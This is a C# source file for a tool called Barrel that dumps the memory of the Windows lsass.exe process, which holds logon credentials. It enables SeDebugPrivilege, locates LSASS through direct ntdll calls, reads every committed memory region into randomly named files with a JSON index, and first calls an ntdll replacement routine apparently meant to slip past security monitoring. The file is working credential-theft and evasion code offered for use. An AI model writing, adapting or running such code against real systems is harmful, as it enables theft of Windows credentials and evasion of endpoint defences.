using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static Barrel.NT;
using System.Collections.Generic;
using System.Text;


namespace Barrel
{
    internal class Program
    {
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_NOACCESS = 0x01;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;
        public const uint MemoryBasicInformation = 0;
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const uint FileAccess_FILE_GENERIC_WRITE = 0x120116;
        public const uint FileAttributes_Normal = 128;
        public const uint FileShare_Write = 2;
        public const uint CreationDisposition_FILE_OVERWRITE_IF = 5;
        public const uint CreateOptionFILE_SYNCHRONOUS_IO_NONALERT = 32;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;


        [DllImport("ntdll.dll")]
        public static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID processId);

        [DllImport("ntdll.dll")]
        public static extern bool NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateFile(out IntPtr FileHadle, uint DesiredAcces, ref OBJECT_ATTRIBUTES ObjectAttributes, ref IO_STATUS_BLOCK IoStatusBlock, ref long AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtWriteFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, IntPtr ByteOffset, IntPtr Key);

        [DllImport("ntdll.dll")]
        public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtClose(IntPtr hObject);


        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public int AllocationProtect;
            public IntPtr RegionSize;
            public int State;
            public int Protect;
            public int Type;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct IO_STATUS_BLOCK
        {
            public uint status;
            public IntPtr information;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static void WriteToBinFile(byte[] buffer, int bufferSize, string filename)
        {
            // Create to file
            IntPtr hFile;
            UNICODE_STRING fname = new UNICODE_STRING();
            string current_dir = System.IO.Directory.GetCurrentDirectory();
            RtlInitUnicodeString(out fname, @"\??\" + current_dir + "\\" + filename);
            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(fname));
            Marshal.StructureToPtr(fname, objectName, true);
            OBJECT_ATTRIBUTES FileObjectAttributes = new OBJECT_ATTRIBUTES
            {
                Length = (int)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = objectName,
                Attributes = OBJ_CASE_INSENSITIVE,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };
            IO_STATUS_BLOCK IoStatusBlock = new IO_STATUS_BLOCK();
            long allocationSize = 0;
            uint ntstatus = NtCreateFile(
                out hFile,
                FileAccess_FILE_GENERIC_WRITE,
                ref FileObjectAttributes,
                ref IoStatusBlock,
                ref allocationSize,
                FileAttributes_Normal, // 0x80 = 128 https://learn.microsoft.com/es-es/dotnet/api/system.io.fileattributes?view=net-7.0
                FileShare_Write, // 2 - https://learn.microsoft.com/en-us/dotnet/api/system.io.fileshare?view=net-8.0
                CreationDisposition_FILE_OVERWRITE_IF, // 5 - https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
                CreateOptionFILE_SYNCHRONOUS_IO_NONALERT, // 32 -  https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
                IntPtr.Zero,
                0
            );
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Calling NtOpenFile failed.");
                Environment.Exit(0);
            }

            // Write to file
            ntstatus = NtWriteFile(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref IoStatusBlock, buffer, (uint)bufferSize, IntPtr.Zero, IntPtr.Zero);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Calling NtWriteFile failed.");
                Environment.Exit(0);
            }
        }


        static string getRandomString(int length, Random random)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            for (int i = 0; i < length; i++)
            {
                int index = random.Next(chars.Length);
                stringBuilder.Append(chars[index]);
            }
            return stringBuilder.ToString();
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static void WriteToFile(string path, string content)
        {
            System.IO.File.WriteAllText(path, content);
            Console.WriteLine("[+] File " + path + " generated.");
        }


        public static List<IntPtr> GetProcessByName(string proc_name)
        {
            IntPtr aux_handle = IntPtr.Zero;
            int MAXIMUM_ALLOWED = 0x02000000;
            List<IntPtr> handles_list = new List<IntPtr>();

            while (!NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, out aux_handle))
            {
                StringBuilder fileName = new StringBuilder(100);
                GetProcessImageFileName(aux_handle, fileName, 100);
                char[] stringArray = fileName.ToString().ToCharArray();
                Array.Reverse(stringArray);
                string reversedStr = new string(stringArray);
                int index = reversedStr.IndexOf("\\");
                if (index != -1)
                {
                    string res = reversedStr.Substring(0, index);
                    stringArray = res.ToString().ToCharArray();
                    Array.Reverse(stringArray);
                    res = new string(stringArray);
                    if (res == proc_name)
                    {
                        handles_list.Add(aux_handle);
                    }
                }
            }
            return handles_list;
        }


        unsafe static int get_pid(IntPtr process_handle)
        {
            uint process_basic_information_size = 48;
            int pid_offset = 0x20;

            // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
            byte[] pbi_byte_array = new byte[process_basic_information_size];

            // Create a PROCESS_BASIC_INFORMATION structure in the byte array
            IntPtr pbi_addr = IntPtr.Zero;
            fixed (byte* p = pbi_byte_array)
            {
                pbi_addr = (IntPtr)p;

                uint ntstatus = NtQueryInformationProcess(process_handle, 0x0, pbi_addr, process_basic_information_size, out uint ReturnLength);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
            }

            // Get PEB Base Address
            IntPtr peb_pointer = pbi_addr + pid_offset;
            IntPtr pebaddress = Marshal.ReadIntPtr(peb_pointer);
            return (int)pebaddress;
        }


        static void Barrel(string file_name, string mem_name, bool big_file) {
            Random random = new Random();
            // Create directory for all dump files
            string path_ = @"" + mem_name;
            if (!big_file && mem_name == "") {
                path_ = @"" + getRandomString(5, random) + "\\";
                if (!System.IO.Directory.Exists(path_))
                {
                    System.IO.Directory.CreateDirectory(path_);
                }
            }

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process name
            string proc_name = "lsass.exe";
            IntPtr process_handle = GetProcessByName(proc_name).First();
            int processPID = get_pid(process_handle);

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            byte[] aux_bytearray = { };
            string[] aux_array_1 = { };
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemory(processHandle, aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and committed -> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);
                    // Create dump file for this region
                    if (!big_file)
                    {
                        WriteToBinFile(buffer, (int)mbi.RegionSize, (path_ + memdump_filename));
                    }
                    // Add to JSON file                    
                    string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                    aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();
                    // Add to global byte array
                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
                    aux_bytearray = new_bytearray;
                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }
            // Write JSON file
            string barrel_json_content = ToJsonArray(aux_array_1);
            WriteToFile(file_name, barrel_json_content);

            // Create binary file with all memory regions
            if (big_file)
            {
                if (mem_name == "")
                {
                    mem_name = getRandomString(10, random) + "." + getRandomString(3, random);
                }
                WriteToBinFile(aux_bytearray, aux_bytearray.Length, mem_name);
                Console.WriteLine("[+] File created at " + mem_name);
            }
            else {
                Console.WriteLine("[+] Files created at directory " + path_);
            }
        }


        static void Main(string[] args)
        {
            // Replace ntdll library
            string option = "";
            string wildcard_option = "";
            if (args.Length >= 1)
            {
                option = args[0];
            }
            if (args.Length >= 2)
            {
                wildcard_option = args[1];
            }
            ReplaceLibrary(option, wildcard_option);

            // big_file = true  -> Generate one big file with the dump of all memory regions together
            // big_file = false -> Create a directory with a random name and generate one dump file for each region
            bool big_file = false;

            // Get Mem64List information + Dump memory regions
            // Arguments: Name of JSON file; name of directory/file to contain memory dumps
            Barrel("barrel.json", "", big_file);
        }
    }
}